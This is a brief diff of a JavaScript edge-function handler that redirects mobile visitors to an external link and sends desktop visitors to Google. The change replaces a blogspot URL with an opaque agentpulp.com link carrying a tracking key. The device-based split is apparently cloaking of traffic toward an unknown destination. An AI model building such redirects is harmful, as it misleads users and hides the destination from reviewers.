@@ -31,7 +31,7 @@ export async function onRequest(context) {
   const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
 
   if (isMobile) {
-    return Response.redirect("https://waseey.blogspot.com/?utm_source=Ambani&utm_medium=Mumbai", 302);
+    return Response.redirect("https://agentpulp.com/rqbamyp64c?key=866bc5ba1e525b6c9b55bb8d072f8b91", 302);
   } else {
     return Response.redirect("https://www.google.com", 302);
   }
